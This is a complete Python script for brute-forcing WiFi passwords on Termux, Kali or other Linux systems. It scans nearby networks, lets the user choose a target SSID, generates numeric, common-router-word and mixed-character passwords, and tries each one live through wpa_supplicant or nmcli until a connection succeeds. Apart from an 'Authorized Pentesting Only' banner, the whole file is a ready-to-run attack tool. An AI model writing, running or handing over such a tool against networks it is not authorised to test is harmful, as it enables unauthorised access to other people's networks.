#!/usr/bin/env python3
"""
WiFi Brute Force Tool - Rootless | Termux & Kali Compatible
Authorized Pentesting Only - Smart Auto Password Generator
Generates all combinations on the fly (numbers, letters, symbols, mixed)
"""

import os
import sys
import time
import re
import itertools
import string
import json
import subprocess
import threading
import queue
import shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ============================================================
# CONFIGURATION - Tweak these
# ============================================================

MIN_LEN = 4        # Minimum password length to try
MAX_LEN = 8        # Maximum password length to try
THREADS = 15       # Parallel threads
BATCH_SIZE = 30    # Passwords per batch submission
MAX_PASSWORDS = 100000  # Safety limit (change or set to None for unlimited)

# Character sets
NUMBERS = string.digits
LOWERCASE = string.ascii_lowercase
UPPERCASE = string.ascii_uppercase
LETTERS = string.ascii_letters
SYMBOLS = "!@#$%^&*()_+-=[]{}|;':\",./<>?~`"
ALL_CHARS = LETTERS + NUMBERS + SYMBOLS

# ============================================================
# ENVIRONMENT DETECTION
# ============================================================

class Environment:
    """Auto-detect whether we're on Termux, Kali, or other Linux"""
    
    @staticmethod
    def detect():
        if 'TERMUX_VERSION' in os.environ or 'com.termux' in __file__:
            return 'termux'
        
        try:
            with open('/etc/os-release') as f:
                content = f.read().lower()
            if 'kali' in content:
                return 'kali'
        except:
            pass
        
        try:
            result = subprocess.run(['uname', '-a'], capture_output=True, text=True)
            if 'kali' in result.stdout.lower():
                return 'kali'
        except:
            pass
        
        return 'linux'

    @staticmethod
    def check_dependencies(env):
        """Check which WiFi tools are available"""
        tools = {}
        
        # Common tools
        for tool in ['iw', 'wpa_supplicant', 'wpa_cli', 'nmcli', 'iwconfig']:
            tools[tool] = shutil.which(tool) is not None
        
        # Termux-specific
        tools['termux-wifi-scaninfo'] = shutil.which('termux-wifi-scaninfo') is not None
        tools['termux-wifi-connectioninfo'] = shutil.which('termux-wifi-connectioninfo') is not None
        
        # Python modules
        try:
            import wifi
            tools['pywifi'] = True
        except ImportError:
            tools['pywifi'] = False
        
        return tools

# ============================================================
# SMART PASSWORD GENERATOR
# ============================================================

def generate_passwords_smart(max_count=500000):
    """
    Smart password generator - ordered by likelihood.
    Creates combinations on the fly, no external wordlist needed.
    """
    count = 0
    
    # ---- STAGE 1: Pure Numeric (most common WiFi passwords) ----
    # Start with short lengths first
    for length in range(4, 11):
        for combo in itertools.product(NUMBERS, repeat=length):
            yield ''.join(combo)
            count += 1
            if max_count and count >= max_count:
                return
    
    # ---- STAGE 2: Common words + number suffixes ----
    common_bases = [
        'password', 'admin', 'wifi', 'guest', 'home', 'default',
        'linksys', 'net', 'family', 'mobile', 'hotel', 'free',
        '1234', 'arris', 'belkin', 'dlink', 'tp', 'tplink',
        'internet', 'access', 'router', 'secure', 'private'
    ]
    suffixes = ['', '1', '12', '123', '1234', '12345', '!', '@', '#',
                '2024', '2025', '2026', '01', '007', '69', '420']
    
    for base in common_bases:
        for suffix in suffixes:
            pwd = base + suffix
            if len(pwd) >= MIN_LEN:
                yield pwd
                count += 1
                if max_count and count >= max_count:
                    return
    
    # ---- STAGE 3: Lowercase letters only ----
    for length in range(5, 10):
        for combo in itertools.product(LOWERCASE, repeat=length):
            yield ''.join(combo)
            count += 1
            if max_count and count >= max_count:
                return
    
    # ---- STAGE 4: Lowercase + numbers ----
    alphanum = LOWERCASE + NUMBERS
    for length in range(6, 10):
        for combo in itertools.product(alphanum, repeat=length):
            yield ''.join(combo)
            count += 1
            if max_count and count >= max_count:
                return
    
    # ---- STAGE 5: Mixed case + numbers ----
    mix = LOWERCASE + UPPERCASE + NUMBERS
    for length in range(6, 9):
        for combo in itertools.product(mix, repeat=length):
            yield ''.join(combo)
            count += 1
            if max_count and count >= max_count:
                return
    
    # ---- STAGE 6: Full charset (letters + numbers + symbols) ----
    for length in range(6, 9):
        for combo in itertools.product(ALL_CHARS, repeat=length):
            yield ''.join(combo)
            count += 1
            if max_count and count >= max_count:
                return


# ============================================================
# WIFI CONNECTION BACKENDS
# ============================================================

class TermuxWiFiBackend:
    """Rootless WiFi control via Termux API"""
    
    def __init__(self):
        self.enabled = (
            shutil.which('termux-wifi-scaninfo') is not None
        )
    
    def scan(self):
        """Scan networks using termux-wifi-scaninfo"""
        try:
            result = subprocess.run(
                ['termux-wifi-scaninfo'],
                capture_output=True, text=True, timeout=15
            )
            if result.returncode == 0:
                networks = json.loads(result.stdout)
                return [
                    {'ssid': n.get('ssid', ''), 'bssid': n.get('bssid', ''),
                     'capabilities': n.get('capabilities', '')}
                    for n in networks if n.get('ssid')
                ]
        except:
            pass
        return []
    
    def try_password(self, ssid, password):
        """Attempt connection via termux-wifi-connectioninfo after setting up wpa_supplicant"""
        # Create a temporary wpa_supplicant config
        config_content = f"""ctrl_interface=/data/data/com.termux/files/usr/var/run/wpa_supplicant
update_config=1
network={{
    ssid="{ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
"""
        config_path = "/data/data/com.termux/files/usr/etc/wpa_supplicant/wpa_supplicant.conf"
        os.makedirs(os.path.dirname(config_path), exist_ok=True)
        
        try:
            with open(config_path, 'w') as f:
                f.write(config_content)
            
            # Try using iw to connect (rootless if nl80211 available)
            result = subprocess.run(
                ['wpa_supplicant', '-B', '-i', 'wlan0',
                 '-c', config_path, '-f', '/dev/null'],
                capture_output=True, text=True, timeout=5
            )
            time.sleep(1.5)
            
            # Check connection
            status = subprocess.run(
                ['wpa_cli', 'status'],
                capture_output=True, text=True, timeout=3
            )
            
            # Cleanup
            subprocess.run(['wpa_cli', 'terminate'], capture_output=True, timeout=3)
            subprocess.run(['pkill', '-f', 'wpa_supplicant'], capture_output=True, timeout=2)
            
            if 'wpa_state=COMPLETED' in status.stdout:
                return True, password
        except:
            pass
        return False, password


class KaliWiFiBackend:
    """For Kali Linux with NetworkManager (nmcli)"""
    
    def __init__(self):
        self.nmcli = shutil.which('nmcli')
    
    def scan(self):
        """Scan using nmcli"""
        if not self.nmcli:
            return []
        try:
            result = subprocess.run(
                ['nmcli', '-t', '-f', 'SSID,BSSID,SECURITY', 'dev', 'wifi', 'list'],
                capture_output=True, text=True, timeout=15
            )
            networks = []
            for line in result.stdout.strip().split('\n'):
                if line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        networks.append({
                            'ssid': parts[0],
                            'bssid': parts[1] if len(parts) > 1 else '',
                            'capabilities': parts[2] if len(parts) > 2 else ''
                        })
            return networks
        except:
            return []
    
    def try_password(self, ssid, password):
        """Try password using nmcli"""
        if not self.nmcli:
            return False, password
        
        try:
            # Remove any existing connection for this SSID
            subprocess.run(
                ['nmcli', 'connection', 'delete', f'wifi-{ssid}'],
                capture_output=True, timeout=5
            )
            
            result = subprocess.run(
                ['nmcli', 'device', 'wifi', 'connect', ssid,
                 'password', password, '--timeout', '5'],
                capture_output=True, text=True, timeout=8
            )
            
            if result.returncode == 0 and 'successfully' in result.stdout.lower():
                # Cleanup
                subprocess.run(
                    ['nmcli', 'connection', 'delete', f'wifi-{ssid}'],
                    capture_output=True, timeout=5
                )
                return True, password
        except:
            pass
        return False, password


# ============================================================
# MAIN CRACKER
# ============================================================

class WiFiCracker:
    def __init__(self):
        self.env = Environment.detect()
        self.tools = Environment.check_dependencies(self.env)
        
        print(f"[*] Detected environment: {self.env.upper()}")
        print(f"[*] Tools available: {', '.join(k for k,v in self.tools.items() if v)}")
        
        # Auto-select backend
        if self.env == 'termux' and self.tools.get('termux-wifi-scaninfo'):
            self.backend = TermuxWiFiBackend()
        elif self.tools.get('nmcli'):
            self.backend = KaliWiFiBackend()
        else:
            print("[!] No compatible WiFi backend found!")
            print("    Termux: Install 'termux-api' package and termux:API app")
            print("    Kali:   Use 'apt install network-manager'")
            sys.exit(1)
        
        self.found = False
        self.password = None
        self.attempts = 0
        self.start_time = None
        self.lock = threading.Lock()
    
    def scan_networks(self):
        """Scan and display available networks"""
        print("\n[*] Scanning for WiFi networks...")
        networks = self.backend.scan()
        
        if not networks:
            print("[!] No networks found or scan failed")
            return []
        
        print(f"\n  {'#':>3} | {'SSID':<30} | {'BSSID':<20}")
        print(f"  {'-'*3}-+-{'-'*30}-+-{'-'*20}")
        
        for i, net in enumerate(networks[:30]):
            ssid = net['ssid'][:28] if net['ssid'] else '<hidden>'
            bssid = net.get('bssid', 'N/A')[:17]
            print(f"  {i+1:>3} | {ssid:<30} | {bssid:<20}")
        
        return networks
    
    def try_password_batch(self, ssid, batch, results_queue):
        """Thread worker - tries a batch of passwords"""
        for pwd in batch:
            if self.found:
                return
            
            with self.lock:
                self.attempts += 1
            
            success, found_pwd = self.backend.try_password(ssid, pwd)
            if success:
                self.found = True
                self.password = found_pwd
                results_queue.put(('FOUND', found_pwd))
                return
    
    def crack(self, ssid, max_passwords=100000):
        """Main cracking loop"""
        self.start_time = time.time()
        
        print(f"\n{'='*60}")
        print(f"  TARGET     : {ssid}")
        print(f"  ENVIRONMENT: {self.env.upper()}")
        print(f"  MODE       : Auto-generate passwords (smart order)")
        print(f"  MAX TRIES  : {max_passwords if max_passwords else 'Unlimited'}")
        print(f"  THREADS    : {THREADS}")
        print(f"{'='*60}\n")
        
        # Generate passwords
        pwd_gen = generate_passwords_smart(max_passwords)
        
        # Setup threading
        results_queue = queue.Queue()
        batch = []
        total_sent = 0
        speed_samples = []
        
        # Speed monitor thread
        def monitor():
            while not self.found:
                time.sleep(3)
                elapsed = time.time() - self.start_time
                with self.lock:
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    progress = (self.attempts / max_passwords * 100) if max_passwords else 0
                    eta = (max_passwords - self.attempts) / rate if rate > 0 else 0
                    
                    print(f"  [RUN] {self.attempts:,} tries | "
                          f"{rate:.1f} pwd/s | "
                          f"{progress:.1f}% | "
                          f"ETA: {eta:.0f}s", end='\r')
        
        monitor_thread = threading.Thread(target=monitor, daemon=True)
        monitor_thread.start()
        
        # Main loop - submit batches to thread pool
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = []
            
            for pwd in pwd_gen:
                if self.found:
                    break
                
                batch.append(pwd)
                total_sent += 1
                
                if len(batch) >= BATCH_SIZE:
                    futures.append(
                        executor.submit(
                            self.try_password_batch, ssid, batch, results_queue
                        )
                    )
                    batch = []
                    
                    # Check results without blocking
                    while not results_queue.empty():
                        status, result = results_queue.get()
                        if status == 'FOUND':
                            self.found = True
                            break
            
            # Don't forget the last partial batch
            if batch and not self.found:
                futures.append(
                    executor.submit(
                        self.try_password_batch, ssid, batch, results_queue
                    )
                )
            
            # Wait for remaining
            for future in as_completed(futures):
                if self.found:
                    break
        
        # Done
        elapsed = time.time() - self.start_time
        rate = self.attempts / elapsed if elapsed > 0 else 0
        
        print("\n" + "="*60)
        if self.found:
            print(f"\n  ✅ PASSWORD FOUND!")
            print(f"  ┌─────────────────────────────────────────────┐")
            print(f"  │  Password : {self.password:<35}│")
            print(f"  │  Tries    : {self.attempts:<8,}                      │")
            print(f"  │  Time     : {elapsed:<8.1f}s                      │")
            print(f"  │  Speed    : {rate:<8.1f} pwd/s                   │")
            print(f"  └─────────────────────────────────────────────┘")
        else:
            print(f"\n  ❌ Password NOT FOUND in {self.attempts:,} attempts")
            print(f"  Time: {elapsed:.1f}s | Rate: {rate:.1f} pwd/s")
            print(f"  Tip: Increase MAX_LEN or expand character sets")
        
        print("="*60 + "\n")
        return self.password


# ============================================================
# MAIN ENTRY POINT
# ============================================================

def main():
    print("""
╔══════════════════════════════════════════════════════════╗
║           WiFi BRUTE FORCE - Rootless Edition            ║
║     Smart Password Generator - No Wordlist Needed        ║
║     Works on: Termux | Kali | Linux                      ║
║     Authorized Pentesting Only                           ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    cracker = WiFiCracker()
    
    # Scan or manual SSID
    print("[1] Scan for nearby networks")
    print("[2] Enter SSID manually")
    choice = input("\nSelect (1/2): ").strip()
    
    ssid = None
    
    if choice == '1':
        networks = cracker.scan_networks()
        if networks:
            try:
                sel = int(input("\nSelect network number: "))
                ssid = networks[sel - 1]['ssid']
            except (ValueError, IndexError):
                print("[!] Invalid selection")
                ssid = input("Enter SSID manually: ").strip()
        else:
            print("[!] No networks found")
            ssid = input("Enter SSID manually: ").strip()
    elif choice == '2':
        ssid = input("Enter target SSID: ").strip()
    else:
        print("[!] Invalid option")
        sys.exit(1)
    
    if not ssid:
        print("[!] No SSID provided")
        sys.exit(1)
    
    # Max passwords
    max_input = input(f"Max passwords to try [default {MAX_PASSWORDS:,}]: ").strip()
    max_pwd = int(max_input) if max_input.isdigit() else MAX_PASSWORDS
    
    cracker.crack(ssid, max_pwd)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user. Exiting...")
        sys.exit(0)
